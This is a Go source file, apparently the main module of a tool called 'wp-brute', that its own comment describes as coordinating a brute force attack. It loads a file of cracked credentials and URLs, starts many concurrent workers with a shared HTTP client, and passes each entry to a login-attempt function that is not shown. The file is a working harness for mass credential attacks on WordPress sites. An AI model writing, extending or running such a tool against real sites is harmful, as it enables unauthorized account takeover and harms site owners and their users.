package main

import (
	"fmt"
	"net/http"
	_ "net/http/pprof"
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"

	"github.com/gosuri/uilive"
)

var workers int
var credentials []string
var credentialsChannel chan string

// Entry point - sets up and coordinates the brute force attack
func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	writer = uilive.New()
	writer.Start()
	defer writer.Stop()
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()
	var wg sync.WaitGroup

	if len(os.Args) != 3 {
		fmt.Printf("Usage: wp-brute <credential_file> <Threads>\n")
		return
	}

	crackedfile := os.Args[1]

	var err error
	workers, err = strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Printf("Error converting string to int: %v", err)
		return
	}

	credentials, err = readCredentials(crackedfile)
	if err != nil {
		fmt.Printf("[*] Error reading keys from file: %v", err)
		os.Exit(1)
	}

	total = len(credentials)
	credentialsChannel = make(chan string, total*2)

	fmt.Printf("Total URLs to check: %d\n", total)
	// Start progress display goroutine
	wg.Add(1)
	go func() {
		defer wg.Done()
		for range time.Tick(updateInterval) {
			displayProgress()
		}
	}()

	// Create a shared HTTP client for all workers
	httpClient := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:        0, // Match worker count
			MaxIdleConnsPerHost: 0, // Keep per-host limit reasonable
			MaxConnsPerHost:     0, // Add limit per host to prevent overwhelming
			IdleConnTimeout:     90 * time.Second,
			DisableKeepAlives:   false, // Ensure keep-alives are enabled
			DisableCompression:  true,  // Disable compression for better performance
			ForceAttemptHTTP2:   false, // Disable HTTP/2 for more consistent behavior

		},
	}

	// Start worker routines with shared client
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go worker(&wg, httpClient)
	}

	// Add credentials to the channel
	for _, cred := range credentials {
		credentialsChannel <- cred
	}
	close(credentialsChannel)

	wg.Wait()
}

// Processes credentials from channel using shared HTTP client
func worker(wg *sync.WaitGroup, client *http.Client) {
	defer wg.Done()
	for url := range credentialsChannel {
		wpbrute(url, client)
	}
}
